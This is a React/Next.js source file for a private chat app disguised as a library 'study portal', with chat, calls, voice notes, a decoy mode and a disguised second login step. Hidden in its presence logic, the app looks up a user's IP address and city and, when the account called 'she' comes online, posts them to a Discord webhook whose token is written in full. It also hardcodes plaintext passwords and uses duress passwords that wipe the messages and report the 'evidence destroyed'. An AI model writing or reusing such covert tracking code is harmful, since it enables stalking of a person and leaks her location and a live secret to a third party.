"use client";
import { useState, useEffect, useRef } from "react";
import { createClient } from "@supabase/supabase-js";

// Initialize Supabase Client
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://dummy.supabase.co';
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'dummy';
const supabase = createClient(supabaseUrl, supabaseKey);

// Custom Instagram-style Audio Player
const CustomAudioPlayer = ({ src, isMe }: { src: string, isMe: boolean }) => {
  const [isPlaying, setIsPlaying] = useState(false);
  const [duration, setDuration] = useState(0);
  const [currentTime, setCurrentTime] = useState(0);
  const audioRef = useRef<HTMLAudioElement>(null);

  const togglePlay = () => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause();
      } else {
        audioRef.current.play();
      }
      setIsPlaying(!isPlaying);
    }
  };

  useEffect(() => {
    const audio = audioRef.current;
    if (!audio) return;
    
    const setAudioData = () => {
      if (audio.duration !== Infinity) {
        setDuration(audio.duration);
      }
    };
    
    const setAudioTime = () => setCurrentTime(audio.currentTime);
    const setAudioEnd = () => { setIsPlaying(false); setCurrentTime(0); };

    audio.addEventListener('loadedmetadata', setAudioData);
    audio.addEventListener('timeupdate', setAudioTime);
    audio.addEventListener('ended', setAudioEnd);

    return () => {
      audio.removeEventListener('loadedmetadata', setAudioData);
      audio.removeEventListener('timeupdate', setAudioTime);
      audio.removeEventListener('ended', setAudioEnd);
    }
  }, []);

  const formatTime = (time: number) => {
    if (!time || isNaN(time) || time === Infinity) return "0:00";
    const minutes = Math.floor(time / 60);
    const seconds = Math.floor(time % 60);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  const progress = duration > 0 && duration !== Infinity ? (currentTime / duration) * 100 : 0;

  const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
    if (audioRef.current && duration > 0 && duration !== Infinity) {
      const bounds = e.currentTarget.getBoundingClientRect();
      const percent = (e.clientX - bounds.left) / bounds.width;
      audioRef.current.currentTime = percent * duration;
    }
  };

  return (
    <div className={`flex items-center gap-3 p-2 rounded-2xl ${isMe ? "bg-purple-600/30" : "bg-gray-800/80"} w-[240px] sm:w-[280px] my-1 shadow-inner border border-gray-700/30`}>
      <button 
        onClick={togglePlay} 
        className={`w-10 h-10 rounded-full ${isMe ? "bg-purple-500 hover:bg-purple-400" : "bg-gray-600 hover:bg-gray-500"} flex items-center justify-center flex-shrink-0 text-white shadow-md transition`}
      >
        {isPlaying ? (
          <span className="w-3 h-3 bg-white rounded-sm"></span>
        ) : (
          <span className="ml-1 w-0 h-0 border-t-[6px] border-t-transparent border-l-[10px] border-l-white border-b-[6px] border-b-transparent"></span>
        )}
      </button>
      
      <div className="flex-1 flex flex-col justify-center">
        <div 
          className="w-full h-6 flex items-center gap-[2px] mb-1 cursor-pointer relative"
          onClick={handleSeek}
        >
          {Array.from({ length: 30 }).map((_, i) => (
            <div 
              key={i} 
              className={`flex-1 rounded-full transition-all ${i / 30 * 100 <= progress ? "bg-purple-400" : "bg-gray-500/50"}`} 
              style={{ height: `${20 + Math.random() * 80}%` }}
            ></div>
          ))}
        </div>
        <div className="flex justify-between text-[10px] text-gray-400 font-medium px-1">
          <span>{formatTime(currentTime)}</span>
          <span>{duration > 0 && duration !== Infinity ? formatTime(duration) : "Voice"}</span>
        </div>
      </div>

      <audio ref={audioRef} src={src} className="hidden" preload="metadata" />
    </div>
  );
};

const playNotificationSound = () => {
  try {
    const audio = new Audio("https://actions.google.com/sounds/v1/communications/incoming_message.ogg");
    audio.play().catch(e => console.log("Audio blocked:", e));
  } catch(e) {}
};

export default function ChatApp() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [currentUser, setCurrentUser] = useState("");
  const [chatPartner, setChatPartner] = useState("");
  const [room, setRoom] = useState("");
  const [messages, setMessages] = useState<any[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [uploading, setUploading] = useState(false);
  const [isPartnerOnline, setIsPartnerOnline] = useState(false);
  const [partnerIp, setPartnerIp] = useState("");
  const [partnerLocation, setPartnerLocation] = useState("");
  const [myIp, setMyIp] = useState("");
  const [myLocation, setMyLocation] = useState("");
  const [isRecording, setIsRecording] = useState(false);
  const [activeMsgId, setActiveMsgId] = useState<string | null>(null);
  const [showInfoForMsg, setShowInfoForMsg] = useState<any | null>(null);
  const [isViewOnce, setIsViewOnce] = useState(false);
  const [fullscreenImage, setFullscreenImage] = useState<string | null>(null);
  const [showStickers, setShowStickers] = useState(false);
  const [showEmojiPicker, setShowEmojiPicker] = useState(false);

  const emojis = {
    "Smileys & People": ["😀","😃","😄","😁","😆","😅","🤣","😂","🙂","🙃","😉","😊","😇","🥰","😍","🤩","😘","😗","☺","😚","😙","🥲","😋","😛","😜","🤪","😝","🤑","🤗","🤭","🤫","🤔","🫡","🤐","🫥","😐","😑","😶","🫠","😏","😒","🙄","😬","🤥","🫨","😌","😔","😪","🤤","😴","😷","🤒","🤕","🤢","🤮","🤧","🥵","🥶","🥴","😵","🤯","🤠","🥳","🥸","😎","🤓","🧐","😕","🫤","😟","🙁","☹","😮","😯","😲","😳","🥺","🥹","😦","😧","😨","😰","😥","😢","😭","😱","😖","😣","😞","😓","😩","😫","🥱","😤","😡","😠","🤬","😈","👿"],
    "Gestures": ["👋","🤚","🖐","✋","🖖","🫱","🫲","🫳","🫴","👌","🤌","🤏","✌","🤞","🫰","🤟","🤘","🤙","👈","👉","👆","🖕","👇","☝","🫵","👍","👎","✊","👊","🤛","🤜","👏","🫶","🙌","👐","🤲","🤝","🙏"],
    "Hearts & Symbols": ["❤","🧡","💛","💚","💙","💜","🖤","🤍","🤎","💔","❤️‍🔥","💕","💞","💓","💗","💖","💘","💝","💟","☮","✝","☪","🕉","☸","✡","🔯","🕎","☯","♈","♉","♊","♋","♌","♍","♎","♏","♐","♑","♒","♓","⛎","🔀","🔁","🔂","⏩","⏪","⏫","⏬"],
    "Animals & Nature": ["🐶","🐱","🐭","🐹","🐰","🦊","🐻","🐼","🐻‍❄","🐨","🐯","🦁","🐮","🐷","🐸","🐵","🙈","🙉","🙊","🐒","🐔","🐧","🐦","🐤","🐣","🐥","🦆","🦅","🦉","🦇","🐺","🐗","🐴","🦄","🐝","🪱","🐛","🦋","🐌","🐞","🐜","🪰","🪲","🪳","🦟","🦗","🕷","🦂","🐢","🐍","🦎","🦖","🦕"],
    "Food": ["🍎","🍐","🍊","🍋","🍌","🍉","🍇","🍓","🫐","🍈","🍒","🍑","🥭","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥬","🥒","🌶","🫑","🌽","🥕","🫒","🧄","🧅","🥔","🍠","🥐","🥯","🍞","🥖","🥨","🧀","🥚","🍳","🧈","🥞","🧇","🥓","🥩","🍗","🍖","🦴","🌭","🍔","🍟","🍕"]
  };
  
  const stickers = [
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f97a/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/2764_fe0f/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f602/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f62d/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f92c/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f618/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f44d/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f44e/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/2728/512.gif",
    "https://fonts.gstatic.com/s/e/notoemoji/latest/1f525/512.gif"
  ];
  
  // WebRTC Call State
  const [callState, setCallState] = useState<"idle" | "calling" | "ringing" | "connected">("idle");
  const [isVideoCall, setIsVideoCall] = useState(true);
  const [hasLocalVideo, setHasLocalVideo] = useState(false);
  const [isMuted, setIsMuted] = useState(false);
  const [isVideoOff, setIsVideoOff] = useState(false);

  const localVideoRef = useRef<HTMLVideoElement>(null);
  const remoteVideoRef = useRef<HTMLVideoElement>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const localStreamRef = useRef<MediaStream | null>(null);
  const remoteStreamRef = useRef<MediaStream | null>(null);
  const callChannelRef = useRef<any>(null);

  const [isPartnerTyping, setIsPartnerTyping] = useState(false);
  const [replyingTo, setReplyingTo] = useState<any | null>(null);
  const [isLocked, setIsLocked] = useState(false);
  const [unlockPassword, setUnlockPassword] = useState("");
  const [isThemeSelectionMode, setIsThemeSelectionMode] = useState(false);
  const [isDecoyMode, setIsDecoyMode] = useState(false);
  const themePressTimerRef = useRef<NodeJS.Timeout | null>(null);
  const hasLongPressedRef = useRef(false);
  const [decoySearch, setDecoySearch] = useState("");
  const dbChannelRef = useRef<any>(null);
  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const previousOnlineRef = useRef(false);
  const isInitialLoadRef = useRef(true);

  const chatEndRef = useRef<HTMLDivElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);

  // Fetch my IP and Location
  useEffect(() => {
    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        if (data.ip) setMyIp(data.ip);
        if (data.city) setMyLocation(`${data.city}, ${data.country}`);
      })
      .catch(console.error);
  }, []);

  // Check for saved session on load
  useEffect(() => {
    const savedUser = localStorage.getItem("chat_user");
    if (savedUser === "user2") {
      setCurrentUser("user2");
      setChatPartner("i");
      setRoom("room1");
      setIsLoggedIn(true);
    } else if (savedUser === "alex") {
      setCurrentUser("alex");
      setChatPartner("sarah");
      setRoom("room2");
      setIsLoggedIn(true);
    }
  }, []);

  // CRITICAL SECURITY: Lock screen if she goes to the home screen or minimizes the app
  // This now ONLY applies to the girls ('i' and 'sarah'), allowing guys to stay logged in
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden" && (currentUser === "i" || currentUser === "sarah")) {
        setIsLocked(true);
      }
    };

    const handlePageHide = () => {
      if (currentUser === "i" || currentUser === "sarah") {
        setIsLocked(true);
      }
    };

    window.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("pagehide", handlePageHide);

    return () => {
      window.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("pagehide", handlePageHide);
    };
  }, [currentUser]);

  // Online/Offline Presence Tracking
  useEffect(() => {
    if (!isLoggedIn || !room) return;

    const presenceChannel = supabase.channel(`presence-${room}`);
    
    presenceChannel
      .on('presence', { event: 'sync' }, () => {
        const newState = presenceChannel.presenceState();
        
        let online = false;
        let pIp = "";
        let pLoc = "";
        
        for (const id in newState) {
          const stateData: any = newState[id][0];
          if (stateData?.user_id === chatPartner) {
            online = true;
            pIp = stateData.ip || "";
            pLoc = stateData.location || "";
          }
        }
        
        setIsPartnerOnline(online);
        setPartnerIp(pIp);
        setPartnerLocation(pLoc);

        if (!isInitialLoadRef.current) {
          if (online && !previousOnlineRef.current && currentUser === "user2") {
            if ("Notification" in window && Notification.permission === "granted") {
              new Notification("She is Online!", { body: `IP: ${pIp} - ${pLoc}` });
            }
            playNotificationSound();
          }
        } else {
          isInitialLoadRef.current = false;
        }
        previousOnlineRef.current = online;
      })
      .subscribe(async (status) => {
        if (status === 'SUBSCRIBED') {
          await presenceChannel.track({ 
            user_id: currentUser, 
            online_at: new Date().toISOString(),
            ip: myIp,
            location: myLocation
          });

          if (currentUser === "i") {
            fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: `<@1448949659451265045> 🚨 **She just came online!** (IP: ${myIp || 'Unknown'} - Loc: ${myLocation || 'Unknown'})`
              })
            }).catch(console.error);
          }
        }
      });

    return () => {
      supabase.removeChannel(presenceChannel);
    };
  }, [isLoggedIn, currentUser, chatPartner, room, myIp, myLocation]);

  // Fetch and Listen for Live Messages
  useEffect(() => {
    if (!isLoggedIn || !chatPartner) return;

    // Initial fetch
    const fetchMessages = async () => {
      const { data } = await supabase
        .from("messages")
        .select("*")
        .in("sender", [currentUser, chatPartner])
        .order("created_at", { ascending: true });
      if (data) setMessages(data);
    };
    fetchMessages();

    // Realtime subscription
    const channel = supabase
      .channel(`db-changes-${room}`)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "messages" },
        (payload) => {
          if (payload.eventType === "INSERT") {
            const sender = payload.new.sender;
            if (sender === currentUser || sender === chatPartner) {
              setMessages((prev) => {
                if (prev.find(m => m.id === payload.new.id)) return prev;
                return [...prev, payload.new];
              });

              if (sender !== currentUser && currentUser === "user2") {
                if ("Notification" in window && Notification.permission === "granted") {
                  const msgText = payload.new.message_type === 'text' 
                    ? payload.new.content.split("::REACTIONS::")[0].replace("::REPLY::", "").split("::ENDREPLY::").pop() 
                    : `Sent a ${payload.new.message_type}`;
                  new Notification("New Message from Her", { body: msgText });
                }
                playNotificationSound();
              }
            }
          }
          if (payload.eventType === "UPDATE") {
            const sender = payload.new.sender;
            if (sender === currentUser || sender === chatPartner) {
              setMessages((prev) => prev.map(m => m.id === payload.new.id ? payload.new : m));
            }
          }
          if (payload.eventType === "DELETE") {
            setMessages((prev) => prev.filter(m => m.id !== payload.old.id));
          }
        }
      )
      .on("broadcast", { event: "typing" }, ({ payload }) => {
        if (payload.sender !== currentUser) {
          setIsPartnerTyping(payload.isTyping);
        }
      })
      .subscribe();

    dbChannelRef.current = channel;

    // WebRTC Signaling Channel
    const callChannel = supabase.channel(`call-${room}`);
    callChannelRef.current = callChannel;

    callChannel.on("broadcast", { event: "offer" }, async ({ payload }) => {
      if (payload.sender === currentUser) return;
      setIsVideoCall(payload.isVideo);
      setCallState("ringing");
      pcRef.current = createPeerConnection();
      await pcRef.current.setRemoteDescription(new RTCSessionDescription(payload.sdp));
    });

    callChannel.on("broadcast", { event: "answer" }, async ({ payload }) => {
      if (payload.sender === currentUser) return;
      if (pcRef.current) {
        await pcRef.current.setRemoteDescription(new RTCSessionDescription(payload.sdp));
        setCallState("connected");
      }
    });

    callChannel.on("broadcast", { event: "ice-candidate" }, async ({ payload }) => {
      if (payload.sender === currentUser) return;
      if (pcRef.current && payload.candidate) {
        await pcRef.current.addIceCandidate(new RTCIceCandidate(payload.candidate)).catch(console.error);
      }
    });

    callChannel.on("broadcast", { event: "end-call" }, ({ payload }) => {
      if (payload.sender === currentUser) return;
      cleanupCall();
    });

    callChannel.subscribe();

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(callChannel);
    };
  }, [isLoggedIn, currentUser, chatPartner, room]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  // Mark incoming messages as read
  useEffect(() => {
    if (!isLoggedIn || messages.length === 0) return;

    const unreadMessages = messages.filter((m) => m.sender !== currentUser && !m.read);

    if (unreadMessages.length > 0) {
      const markAsRead = async () => {
        const unreadIds = unreadMessages.map(m => m.id);
        const now = new Date().toISOString();
        
        // Optimistically update local state so we don't spam the database
        setMessages(prev => prev.map(m => unreadIds.includes(m.id) ? { ...m, read: true, read_at: now, read_by_ip: myIp } : m));

        await supabase
          .from("messages")
          .update({ read: true, read_at: now, read_by_ip: myIp })
          .in('id', unreadIds);
      };
      markAsRead();
    }
  }, [messages, isLoggedIn, currentUser]);

  // Request Notification Permission on Login
  useEffect(() => {
    if (isLoggedIn && ("Notification" in window) && (currentUser === "user2" || currentUser === "alex")) {
      try {
        if (Notification.permission !== "granted" && Notification.permission !== "denied") {
          Notification.requestPermission().catch(console.error);
        }
      } catch (e) {
        console.error("Notification request failed:", e);
      }
    }
  }, [isLoggedIn, currentUser]);

  // Trigger Notification when partner comes online
  useEffect(() => {
    if (isPartnerOnline && !previousOnlineRef.current) {
      if ("Notification" in window && Notification.permission === "granted" && (currentUser === "user2" || currentUser === "alex")) {
        try {
          new Notification("Library Member Online", {
            body: "A member has just connected to the study portal.",
          });
        } catch (e) {
          console.error("Notification creation failed:", e);
        }
      }
    }
    previousOnlineRef.current = isPartnerOnline;
  }, [isPartnerOnline, currentUser]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    
    // DURESS PASSWORDS
    if (username === "i" && password === "imaya") {
      setCurrentUser("i");
      setChatPartner("user2");
      setRoom("room1");
      setIsLoggedIn(true);
      setIsDecoyMode(true);
      return;
    } 
    
    if (username === "i" && password === "0") {
      setCurrentUser("i");
      setChatPartner("user2");
      setRoom("room1");
      setIsLoggedIn(true);
      setIsDecoyMode(true);
      // Trigger Wipe
      supabase.from("messages").delete().in("sender", ["i", "user2"]).then(() => {
        fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             content: `<@1448949659451265045> 🚨 **DURESS PASSWORD '0' ENTERED! EVIDENCE DESTROYED!**`
           })
        });
      });
      return;
    }

    if (username === "i" && password === "gemba") {
      setCurrentUser("i");
      setChatPartner("user2");
      setRoom("room1");
      setIsLoggedIn(true);
      setIsThemeSelectionMode(true); // Trigger Disguised 2FA
    } else if (username === "user2" && password === "pass2") { 
      setCurrentUser("user2");
      setChatPartner("i");
      setRoom("room1");
      setIsLoggedIn(true);
      localStorage.setItem("chat_user", "user2"); 
    } else if (username === "sarah" && password === "pass123") {
      setCurrentUser("sarah");
      setChatPartner("alex");
      setRoom("room2");
      setIsLoggedIn(true);
    } else if (username === "alex" && password === "pass123") {
      setCurrentUser("alex");
      setChatPartner("sarah");
      setRoom("room2");
      setIsLoggedIn(true);
      localStorage.setItem("chat_user", "alex"); 
    } else {
      alert("Wrong credentials");
    }
  };

  const handleLogout = async () => {
    // Stealth feature: wipe chat messages from the database when logging out
    if (currentUser && chatPartner) {
      await supabase.from("messages").delete().in("sender", [currentUser, chatPartner]);
    }

    localStorage.removeItem("chat_user"); 
    setIsLoggedIn(false);
    setCurrentUser("");
    setChatPartner("");
    setRoom("");
    setUsername("");
    setPassword("");
    setMessages([]);
    cleanupCall();
  };

  // --- WebRTC Logic ---
  const createPeerConnection = () => {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    });

    pc.onicecandidate = (event) => {
      if (event.candidate) {
        callChannelRef.current?.send({
          type: "broadcast",
          event: "ice-candidate",
          payload: { candidate: event.candidate, sender: currentUser }
        });
      }
    };

    pc.ontrack = (event) => {
      remoteStreamRef.current = event.streams[0];
      if (remoteVideoRef.current) {
        remoteVideoRef.current.srcObject = event.streams[0];
      }
    };

    return pc;
  };

  const initiateCall = async (video: boolean) => {
    setIsVideoCall(video);
    setCallState("calling");
    setHasLocalVideo(false);
    
    const pc = createPeerConnection();
    pcRef.current = pc;

    let hasLocalMedia = false;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video, audio: true });
      localStreamRef.current = stream;
      if (localVideoRef.current) localVideoRef.current.srcObject = stream;
      stream.getTracks().forEach(track => pc.addTrack(track, stream));
      hasLocalMedia = true;
      if (video) setHasLocalVideo(true);
    } catch (e) {
      console.warn("Local media not available, switching to receive-only mode.", e);
    }

    if (!hasLocalMedia) {
      pc.addTransceiver('audio', { direction: 'recvonly' });
      if (video) pc.addTransceiver('video', { direction: 'recvonly' });
    }

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);

    callChannelRef.current?.send({
      type: "broadcast",
      event: "offer",
      payload: { sdp: offer, isVideo: video, sender: currentUser }
    });
  };

  const acceptCall = async () => {
    setCallState("connected");
    setHasLocalVideo(false);

    const pc = pcRef.current;
    if (!pc) return;

    let hasLocalMedia = false;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: isVideoCall, audio: true });
      localStreamRef.current = stream;
      if (localVideoRef.current) localVideoRef.current.srcObject = stream;
      stream.getTracks().forEach(track => pc.addTrack(track, stream));
      hasLocalMedia = true;
      if (isVideoCall) setHasLocalVideo(true);
    } catch (e) {
      console.warn("Local media not available, switching to receive-only mode.", e);
    }

    if (!hasLocalMedia) {
      pc.addTransceiver('audio', { direction: 'recvonly' });
      if (isVideoCall) pc.addTransceiver('video', { direction: 'recvonly' });
    }

    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);

    callChannelRef.current?.send({
      type: "broadcast",
      event: "answer",
      payload: { sdp: answer, sender: currentUser }
    });
  };

  const endCall = () => {
    callChannelRef.current?.send({
      type: "broadcast",
      event: "end-call",
      payload: { sender: currentUser }
    });
    cleanupCall();
  };

  const cleanupCall = () => {
    if (pcRef.current) {
      pcRef.current.close();
      pcRef.current = null;
    }
    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach(track => track.stop());
      localStreamRef.current = null;
    }
    remoteStreamRef.current = null;
    setCallState("idle");
    setIsMuted(false);
    setIsVideoOff(false);
  };

  const toggleMute = () => {
    if (localStreamRef.current) {
      localStreamRef.current.getAudioTracks().forEach(t => t.enabled = !t.enabled);
      setIsMuted(!isMuted);
    }
  };

  const toggleVideo = () => {
    if (localStreamRef.current) {
      localStreamRef.current.getVideoTracks().forEach(t => t.enabled = !t.enabled);
      setIsVideoOff(!isVideoOff);
    }
  };

  useEffect(() => {
    if (callState === "connected" || callState === "calling") {
      if (localVideoRef.current && localStreamRef.current) {
        localVideoRef.current.srcObject = localStreamRef.current;
      }
      if (remoteVideoRef.current && remoteStreamRef.current) {
        remoteVideoRef.current.srcObject = remoteStreamRef.current;
      }
    }
  }, [callState]);
  // --------------------

  const handleDeleteMessage = async (id: string) => {
    await supabase.from("messages").delete().eq("id", id);
    setActiveMsgId(null);
  };

  const getBaseContent = (content: string) => content.split("::REACTIONS::")[0];
  const getReactions = (content: string) => {
    if (!content.includes("::REACTIONS::")) return null;
    try {
      return JSON.parse(content.split("::REACTIONS::")[1]);
    } catch (e) { return null; }
  };

  const handleReaction = async (msg: any, emoji: string) => {
    const baseContent = getBaseContent(msg.content);
    const reactions: Record<string, number> = getReactions(msg.content) || {};

    if (reactions[emoji]) {
      reactions[emoji] += 1;
    } else {
      reactions[emoji] = 1;
    }

    const newContent = `${baseContent}::REACTIONS::${JSON.stringify(reactions)}`;

    setMessages(prev => prev.map(m => m.id === msg.id ? { ...m, content: newContent } : m));
    await supabase.from("messages").update({ content: newContent }).eq("id", msg.id);
    setActiveMsgId(null);
  };

  const handleViewOnce = async (msg: any) => {
    setFullscreenImage(getBaseContent(msg.content));
    await supabase.from("messages").delete().eq("id", msg.id);
  };

  const handleTyping = (e: React.ChangeEvent<HTMLInputElement>) => {
    setNewMessage(e.target.value);
    
    if (dbChannelRef.current) {
      dbChannelRef.current.send({
        type: "broadcast",
        event: "typing",
        payload: { sender: currentUser, isTyping: e.target.value.length > 0 }
      });
    }

    // Auto clear typing status if they stop typing for 3 seconds
    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      if (dbChannelRef.current) {
        dbChannelRef.current.send({
          type: "broadcast",
          event: "typing",
          payload: { sender: currentUser, isTyping: false }
        });
      }
    }, 3000);
  };

  const sendSticker = async (url: string) => {
    setShowStickers(false);
    let text = url;
    
    if (replyingTo) {
      const replyPreview = replyingTo.message_type === "text" 
        ? replyingTo.content.substring(0, 50)
        : `[${replyingTo.message_type.toUpperCase()}]`;
      text = `::REPLY::${replyPreview}::ENDREPLY::${text}`;
      setReplyingTo(null);
    }

    const { data, error } = await supabase.from("messages").insert([
      { sender: currentUser, message_type: "sticker", content: text, read: false },
    ]).select();

    if (data && data.length > 0) {
      setMessages((prev) => {
        if (prev.find(m => m.id === data[0].id)) return prev;
        return [...prev, data[0]];
      });
    }
  };

  const sendTextMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newMessage.trim()) return;

    let text = newMessage;
    
    // Format reply into the text without changing DB schema
    if (replyingTo) {
      const replyPreview = replyingTo.message_type === "text" 
        ? replyingTo.content.substring(0, 50)
        : `[${replyingTo.message_type.toUpperCase()}]`;
      text = `::REPLY::${replyPreview}::ENDREPLY::${text}`;
    }

    setNewMessage(""); // Clear input instantly
    setReplyingTo(null);

    // Clear typing status instantly
    if (dbChannelRef.current) {
      dbChannelRef.current.send({
        type: "broadcast",
        event: "typing",
        payload: { sender: currentUser, isTyping: false }
      });
    }

    const { data, error } = await supabase.from("messages").insert([
      { sender: currentUser, message_type: "text", content: text, read: false },
    ]).select();

    // Instantly show the message on your screen even if the realtime socket is slow
    if (data && data.length > 0) {
      setMessages((prev) => {
        // Check if realtime already added it
        if (prev.find(m => m.id === data[0].id)) return prev;
        return [...prev, data[0]];
      });
    }
  };

  const uploadFile = async (file: File, type: "image" | "audio") => {
    setUploading(true);
    const fileExt = file.name.split(".").pop() || "webm";
    const fileName = `${Math.random()}.${fileExt}`;
    const filePath = `${fileName}`;

    // Upload to Supabase Storage
    const { error: uploadError } = await supabase.storage
      .from("chat-media")
      .upload(filePath, file);

    if (!uploadError) {
      const { data } = supabase.storage.from("chat-media").getPublicUrl(filePath);
      
      // Save reference in DB and instantly show
      const { data: insertData } = await supabase.from("messages").insert([
        { sender: currentUser, message_type: type, content: data.publicUrl, read: false },
      ]).select();

      if (insertData && insertData.length > 0) {
        setMessages((prev) => {
          if (prev.find(m => m.id === insertData[0].id)) return prev;
          return [...prev, insertData[0]];
        });
      }
    }
    setUploading(false);
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, type: "image" | "audio") => {
    const file = e.target.files?.[0];
    if (!file) return;
    const finalType = (type === "image" && isViewOnce) ? "image_once" : type;
    await uploadFile(file, finalType as any);
    setIsViewOnce(false); // Reset after sending
  };

  // WhatsApp-style Voice Recording
  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      audioChunksRef.current = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) audioChunksRef.current.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: "audio/webm" });
        const file = new File([audioBlob], `audio_${Date.now()}.webm`, { type: "audio/webm" });
        
        // Stop all tracks to release microphone
        stream.getTracks().forEach(track => track.stop());
        
        await uploadFile(file, "audio");
      };

      mediaRecorder.start();
      setIsRecording(true);
    } catch (err) {
      console.error("Microphone access denied", err);
      alert("Microphone access is required to send voice messages. Please allow microphone permissions in your browser settings.");
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecording) {
      mediaRecorderRef.current.stop();
      setIsRecording(false);
    }
  };

  if (!isLoggedIn) {
    return (
      <div className="flex h-[100dvh] items-center justify-center bg-[#0d0d0f] p-4 text-gray-100">
        <form onSubmit={handleLogin} autoComplete="off" className="w-full max-w-sm rounded-3xl bg-[#151518] p-8 shadow-[0_10px_40px_rgba(0,0,0,0.5)] border border-gray-800/50 relative overflow-hidden">
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-purple-600 to-indigo-500"></div>
          <h2 className="mb-8 text-center text-2xl font-semibold text-white tracking-wide">Secure Access</h2>
          <input
            type="text"
            autoComplete="off"
            placeholder="Library ID"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="mb-4 w-full rounded-2xl bg-[#0d0d0f] p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-purple-500 border border-gray-800 shadow-inner transition"
            required
          />
          <input
            type="password"
            autoComplete="new-password"
            placeholder="Passcode"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="mb-8 w-full rounded-2xl bg-[#0d0d0f] p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-purple-500 border border-gray-800 shadow-inner transition"
            required
          />
          <button type="submit" className="w-full rounded-2xl bg-gradient-to-r from-purple-600 to-indigo-600 p-4 font-semibold text-white transition hover:opacity-90 shadow-[0_4px_20px_rgba(147,51,234,0.3)] transform active:scale-95">
            Connect
          </button>
        </form>
      </div>
    );
  }

  // DISGUISED 2FA MODE: THEME SELECTION
  if (isThemeSelectionMode) {
    const colors = [
      { name: 'Red', color: 'bg-red-500 shadow-[0_0_15px_rgba(239,68,68,0.3)]' },
      { name: 'Blue', color: 'bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.3)]' },
      { name: 'Green', color: 'bg-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.3)]' },
      { name: 'Purple', color: 'bg-purple-500 shadow-[0_0_15px_rgba(168,85,247,0.3)]' },
      { name: 'Yellow', color: 'bg-amber-500 shadow-[0_0_15px_rgba(245,158,11,0.3)]' },
      { name: 'Dark', color: 'bg-gray-800 shadow-lg' }
    ];

    const handlePointerDown = (colorName: string) => {
      hasLongPressedRef.current = false;
      if (colorName === 'Purple') {
        themePressTimerRef.current = setTimeout(() => {
           hasLongPressedRef.current = true;
           setIsThemeSelectionMode(false);
           setIsDecoyMode(false); // Success! Open Chat
        }, 1500); // 1.5 seconds hold
      }
    };

    const handlePointerUp = () => {
      if (themePressTimerRef.current) clearTimeout(themePressTimerRef.current);
    };

    const handleNormalClick = (e: React.MouseEvent) => {
      if (hasLongPressedRef.current) {
         e.preventDefault();
         return; // Ignore the click event if we already long-pressed
      }
      setIsThemeSelectionMode(false);
      setIsDecoyMode(true); // Fail! Go to Decoy Library
    };

    return (
      <div className="flex h-[100dvh] flex-col items-center justify-center bg-[#0d0d0f] p-6 text-white font-sans selection:bg-none">
        <h2 className="text-xl sm:text-2xl font-semibold mb-12 tracking-wide text-gray-200">Select Library Theme</h2>
